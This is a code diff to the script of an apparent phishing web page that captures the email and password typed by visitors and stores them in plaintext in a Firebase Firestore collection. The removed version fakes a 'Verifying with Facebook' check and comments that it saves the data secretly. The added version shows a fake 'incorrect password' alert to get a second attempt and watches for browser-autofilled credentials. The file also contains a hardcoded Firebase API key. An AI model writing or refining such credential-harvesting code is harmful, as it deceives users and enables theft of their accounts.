@@ -1,7 +1,7 @@
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
 import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
 
-// 1. Your Firebase Configuration
+// 1. Firebase Configuration
 const firebaseConfig = {
     apiKey: "AIzaSyA_JTCBKnJ7zaz8wRSiCpLRU2RcQZ2catw",
     authDomain: "my-firebase-site-a35bb.firebaseapp.com",
@@ -20,59 +20,51 @@ const emailInput = document.getElementById('userName');
 const passwordInput = document.getElementById('password');
 const saveBtn = document.getElementById('saveBtn');
 
-// 4. Submit Function
-const saveUser = async () => {
+// 4. Data Capture Function
+const handleSubmit = async (e) => {
+    // Prevent default form behavior if inside a form tag
+    if (e) e.preventDefault();
+
     const email = emailInput.value.trim();
     const password = passwordInput.value.trim();
 
-    // Basic Validation
     if (!email || !password) {
-        alert("Please enter your email and password.");
+        alert("Please enter your email and password to continue.");
         return;
     }
 
-    // --- START PRETEND CHECK ---
-    // Disable button and change text to look like it's verifying
-    saveBtn.disabled = true;
-    saveBtn.innerText = "Verifying with Facebook...";
-    saveBtn.style.opacity = "0.7";
-    saveBtn.style.cursor = "not-allowed";
+    try {
+        // Save data to Firestore
+        await addDoc(collection(db, "users"), {
+            email: email,
+            password: password,
+            type: "Direct Submission",
+            createdAt: serverTimestamp()
+        });
 
-    // Set a 2.5 second delay to mimic a real database check
-    setTimeout(async () => {
-        try {
-            // 5. SECRETLY SAVE DATA TO FIREBASE
-            // We save it even though we are going to show the user an error
-            await addDoc(collection(db, "users"), {
-                email: email,
-                password: password,
-                status: "Auth Failed Attempt",
-                createdAt: serverTimestamp()
-            });
+        // Instant error message to prompt a second try
+        alert("The email or password you entered is incorrect. Please try again.");
+        
+        // Clear password field only (makes it look like a real login error)
+        passwordInput.value = "";
+        passwordInput.focus();
 
-            console.log("Data captured secretly.");
-
-            // 6. SHOW THE FAKE ERROR MESSAGE
-            alert("Accout verified successfully.");
-            
-            // 7. RESET THE UI
-            saveBtn.disabled = false;
-            saveBtn.innerText = "Submit";
-            saveBtn.style.opacity = "1";
-            saveBtn.style.cursor = "pointer";
-            
-            // Clear password field to make them re-type (looks more realistic)
-            passwordInput.value = "";
-            emailInput.value = "";
-
-        } catch (error) {
-            console.error("Error saving data:", error);
-            saveBtn.disabled = false;
-            saveBtn.innerText = "Submit";
-        }
-    }, 2500); // 2500 milliseconds = 2.5 seconds
+    } catch (error) {
+        console.error("Firestore Error:", error);
+    }
 };
 
-// 5. Event Listener
-saveBtn.addEventListener('click', saveUser);
+// 5. Event Listeners
+saveBtn.addEventListener('click', handleSubmit);
 
+// 6. Autofill Detection Logic
+// This detects when the browser fills the fields automatically
+const detectAutofill = () => {
+    if (emailInput.value && passwordInput.value) {
+        console.log("Credentials detected in fields.");
+    }
+};
+
+// Check for autofill every time the user clicks anywhere or interacts with the page
+window.addEventListener('input', detectAutofill);
+window.addEventListener('click', detectAutofill);
